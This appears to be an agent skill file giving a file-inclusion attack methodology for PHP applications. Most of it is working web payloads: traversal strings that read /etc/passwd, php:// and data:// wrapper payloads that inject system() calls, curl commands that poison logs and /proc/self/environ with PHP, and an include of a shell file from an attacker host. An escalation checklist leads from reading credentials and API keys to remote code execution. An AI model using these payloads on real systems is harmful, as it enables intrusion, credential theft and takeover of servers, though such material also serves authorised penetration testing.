---
name: lfi-rfi-methodology
description: "Local and remote file inclusion: path traversal, wrapper abuse, log poisoning, and escalation to code execution. Use this skill when a parameter controls a file path included by the application."
---

# LFI / RFI

## Overview

LFI includes a local file. Escalation paths: read source, poison logs, use PHP wrappers, or chain with upload. RFI includes a remote file — direct code execution if `allow_url_include` is on.

## Detection

```
?page=../../../../etc/passwd
?page=/etc/passwd
?page=....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?page=....\/....\/etc/passwd
```

## PHP wrappers

```bash
# read source as base64 (bypasses PHP execution)
?page=php://filter/convert.base64-encode/resource=index.php

# read with a chain
?page=php://filter/read=string.rot13/resource=config.php

# data wrapper (needs allow_url_include)
?page=data://text/plain,<?php system($_GET['c']);?>

# input wrapper (POST)
?page=php://input   + POST body with PHP
```

## Log poisoning

Poison a log the app can include:

```bash
# Apache access log
curl -A "<?php system(\$_GET['c']); ?>" https://t/
# then include it
?page=/var/log/apache2/access.log&c=id
```

Other targets: `/var/log/auth.log` (SSH user), `/proc/self/environ` (User-Agent), `/var/log/mail.log`, session files in `/tmp/sess_*`.

## /proc/self/environ

```bash
curl -H "User-Agent: <?php system('id'); ?>" "https://t/?page=/proc/self/environ"
```

## RFI

```
?page=http://attacker/shell.txt
?page=\\attacker\share\shell.txt     # Windows UNC
```

Requires `allow_url_include=On` (rare) or a wrapper.

## Path truncation

Old PHP: append `/.` or `%00` to cut the extension.

## Escalation checklist

1. Read config → database credentials, API keys.
2. Read source → find other vulnerabilities.
3. Log poisoning → RCE.
4. Upload + include → RCE.
5. `/proc/self/fd/N` → include a file descriptor of an uploaded temp file.

## Pitfalls

- `php://filter` cannot execute code but reads it — the most reliable step.
- Modern PHP disables `allow_url_include` by default.
- AppArmor/SELinux may block reading `/etc/passwd` even with LFI.

## Verification

Included content must appear in the response, or a command's output must be visible.
